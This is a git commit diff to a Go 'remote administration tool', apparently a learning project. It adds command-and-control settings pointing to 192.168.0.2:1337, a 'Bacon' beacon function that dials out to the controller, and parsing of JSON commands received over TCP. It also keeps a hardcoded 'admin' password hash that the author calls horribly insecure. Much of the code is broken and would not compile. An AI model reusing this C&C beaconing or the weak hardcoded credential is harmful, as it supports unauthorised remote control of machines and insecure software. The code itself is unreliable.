303d167e189532a354ab4bbe2a9b11efc0a150af
mister-hai <81480735+mister-hai@users.noreply.github.com>
2021-04-03 05:15:22 -0400

    Update remote_administration_tool.go

--- remote_administration_tool.go
+++ remote_administration_tool.go
@@ -15,7 +15,7 @@
 		Project Folder Structure
 			mkdir ~/Desktop/go_practice
 			mkdir ~/Desktop/go_practice/src/
-			touch ~/Desktop/go_practice/src/go_practice
+			touch ~/Desktop/go_practice/src/go_practice.go
 
 		Install the recomended go extension in VSCode
 			- ctrl+shift+p - type in "Go : install tools"
@@ -49,7 +49,7 @@
 	Open the terminal in VSCode and type in
 		- go mod init go_practice
 
-	THINGS SHOULD WORK DO USE THE SUSPEND/SAVE STATE FUNCTION
+	THINGS SHOULD WORK DO NOT USE THE SUSPEND/SAVE STATE FUNCTION
 	YOU WILL BREAK THE INSTALL (at least I did)
 
 	... Careful changing the formatter to "gofmt" it hung my VM
@@ -62,24 +62,38 @@ package go_practice
 import (
 	"bufio"
 	"crypto"
+	"encoding/json"
 	"fmt"
-
-	"github.com/fatih/color"
-
-	//"image/color"
 	"io"
 	"log"
 	"net"
 	"os"
 	"strings"
-	//@v1.10.0"
+
+	// for colorized printing
+	// basic ANSI Escape sequences
+	"github.com/fatih/color"
+
+	// necessary for multicast DNS
+	"github.com/hashicorp/mdns"
 )
 
 // declaring global variables to share our
 // network information between scopes
-// these are for TCP specifically
+// these are for TCP/UDP specifically
 var local_tcpaddr_LAN net.TCPAddr
 var local_tcpaddr_WAN net.TCPAddr
+var local_udpaddr_LAN net.UDPAddr
+var local_udpaddr_WAN net.UDPAddr
+
+// Command And Control
+var remote_tcpport string = ":1337"
+var remote_tcpaddr string = "192.168.0.2" + remote_tcpport
+var remote_udpport string = ":1337"
+var remote_udpaddr string = remote_tcpaddr + remote_udpport
+var PHONEHOME_TCP net.TCPAddr
+var PHONEHOME_UDP net.UDPAddr
+var mdns_server mdns.Server
 
 //-----NAME-------------TYPE-----
 
@@ -89,9 +103,9 @@ var sha256_admin_pass_preencrypted crypto.Hash
 var sha512_admin_pass_preencrypted crypto.Hash
 
 // Horribly insecure implementation
-var sha256_admin_pass_insecure crypto.Hash
-
-//sha256_admin_pass_insecure.Sum256([]byte("admin"))
+var sha256_hash_admin crypto.Hash
+var new_admin_hash = sha256_hash_admin.New()
+var wat = new_admin_hash.Sum([]byte("admin"))
 
 // struct to represent an OS command from the wire
 // we will be shoving a JSON payload into this
@@ -105,7 +119,36 @@ type Command struct {
 
 // Colorized error printing to see what we are doing
 func error_printer(error_object error, message string) {
-	color.Red(error_object, message)
+
+	error_as_string := fmt.Errorf(error_object.Error())
+	// I dont get it but whatever, gotta access Error twice?
+	color.Red(error_as_string.Error(), message)
+}
+
+// This gets placed in a loop to handle net.Conn type
+// containing json
+// AFTER AUTH
+func json_extract(
+	pure_json bool,
+	text_from_conn string,
+	command_struct Command) {
+	/*/
+		use Unmarshal if we expect our data to be pure JSON
+		second parameter is the address of the struct
+		we want to store our arsed data in
+	/*/
+	if pure_json == true {
+		json.Unmarshal([]byte(text_from_conn), &command_struct)
+	}
+	decoder, err = json.Decoder(text_from_conn)
+}
+
+// Beacon
+// makes requests outside the network to get to the C&C
+// ONLY used for reaching out
+func Bacon() {
+	PHONEHOME_TCP.IP = net.IP(remote_tcpaddr)
+	net.DialTCP(PHONEHOME_TCP)
 }
 
 /*
@@ -144,28 +187,30 @@ function to get the hash of a file for integrity checking
 /*/
 func file_hash(path string) {
 	file_hash := crypto.SHA256.New()
-	file_input, error := os.Open(path)
-	if error != nil {
+	file_input, err := os.Open(path)
+	if err != nil {
 		// print the error
-		fmt.Println(error)
+		fmt.Println(err)
 		return
 	}
 	//close file when done reading
-	defer file.Close()
+	defer file_input.Close()
 
 	/*/
 	     copy file buffer to hash compute buffer
 		 the underscore character "_" is called a "blank identifier"
 		 it allows you to ignore left side values
-		 in this case, we are acting like the regular return value doesnt exist
-		 and if there is an error, log that error and exit
+		 in this case, we are acting like the regular return value
+		 doesnt exist and if there is an error, log that error and exit
 		 otherwise, finish copying from buffer to buffer
 	    /*/
 	if _, error := io.Copy(file_hash, file_input); error != nil {
 		log.Fatal(error)
 	}
 	// and compute the hash of the file you provided to this function
-	file_hash_sha256 := file_hash.Sum(nil)
+	//file_hash_sha256 := file_hash.Sum(nil)
+	return file_hash.Sum(nil)
+
 }
 
 // function to provide outbound connections via threading
@@ -174,31 +219,32 @@ func tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
 	// the network functions return two objects
 	// a connection
 	// and an error
-	connection, error := net.DialTCP("tcp", &laddr, &raddr)
+	connection, err := net.DialTCP("tcp", &laddr, &raddr)
 	//generic error printing
 	// if error isnt empty/null/nothingness
-	if error != nil {
+	if err != nil {
 		// print the error
-		fmt.Println(error)
+		error_printer(err, "[-] Error: TCP Connection Failed")
 		return
 	}
-
 	// if there was no error, continue to the control loop
 	// will be basis of control flow
 	for {
 		netData, error := bufio.NewReader(connection).ReadString('\n')
-
+		// again with the error checking, what are we? Hackers?
 		if error != nil {
 			fmt.Println(error)
 			return
 		}
+		json_extract()
 		// stops server if "STOP" Command is sent
 		// TODO: JSONIFY THIS
 		if strings.TrimSpace(string(netData)) == "STOP" {
 			fmt.Println("Exiting TCP server!")
 			return
 		}
-		connection.Write([]byte(myTime))
+		//sending wat!?!?
+		//connection.Write("asdf")
 	}
 }
 
